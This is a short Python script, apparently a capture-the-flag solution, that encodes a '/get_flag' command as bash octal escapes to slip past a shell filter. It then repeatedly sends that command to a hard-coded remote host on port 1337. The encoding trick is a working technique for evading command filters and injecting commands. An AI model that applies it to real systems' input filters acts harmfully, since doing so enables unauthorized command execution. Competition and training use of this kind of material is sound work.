from __future__ import print_function
import socket
from contextlib import closing


def get_meirei():
    str = "/get_flag$'\ \40'gimme_FLAG_please"
    ret = ""
    for moji in str:
        ret += "$'\\" + oct(ord(moji))[2:] + "'"

    print(ret)
    return ret


if __name__ == '__main__':
    host = '35.189.118.225'
    port = 1337
    bufsize = 4096

    get_meirei()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    with closing(sock):
        sock.connect((host, port))
        while True:
            byte_content = sock.recv(bufsize)
            unicode_string = byte_content.decode('utf-8')
            print(unicode_string)
            send_msg = get_meirei() + "\n"

            sock.send(send_msg.encode('utf-8'))
